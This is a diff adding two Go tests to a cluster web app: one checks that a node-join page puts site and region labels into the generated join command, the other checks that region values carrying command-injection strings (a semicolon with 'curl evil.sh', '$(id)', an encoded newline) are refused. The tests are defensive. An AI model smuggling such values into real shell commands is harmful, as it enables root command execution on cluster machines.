@@ -256,3 +256,38 @@ func TestAPublicAddressThatIsNotOneIsRefused(t *testing.T) {
 		t.Error("the page does not say what was wrong with the address")
 	}
 }
+
+// A machine joins in a region as well as at a site: both are labels in the
+// same command, and the page keeps asking about the same machine.
+func TestTheRegionRidesInTheCommand(t *testing.T) {
+	h := joinServer(t, &fakeJoiner{configured: true}, account.RoleOwner)
+
+	body := do(h, signedIn(http.MethodGet,
+		"/cluster/nodes/add?site=dar-b&region=dar")).Body.String()
+	for _, want := range []string{
+		"--node-label topology.kubernetes.io/zone=dar-b",
+		"--node-label topology.kubernetes.io/region=dar",
+		`hx-get="/cluster/nodes/add/status?region=dar&amp;site=dar-b"`,
+		`id="region"`,
+	} {
+		if !strings.Contains(body, want) {
+			t.Errorf("the page is missing %q", want)
+		}
+	}
+}
+
+// A region goes into a root shell too, so one that would end the command
+// takes the whole command away and says why.
+func TestARegionThatCouldEndTheCommandIsRefused(t *testing.T) {
+	h := joinServer(t, &fakeJoiner{configured: true}, account.RoleOwner)
+
+	for _, bad := range []string{"dar%3Bcurl+evil.sh", "DAR", "dar%24%28id%29", "dar%0Aid"} {
+		body := do(h, signedIn(http.MethodGet, "/cluster/nodes/add?region="+bad)).Body.String()
+		if strings.Contains(body, "K3S_TOKEN=") {
+			t.Errorf("a command was built around region %q", bad)
+		}
+		if !strings.Contains(body, "region name must be") {
+			t.Errorf("the page does not say what was wrong with region %q", bad)
+		}
+	}
+}
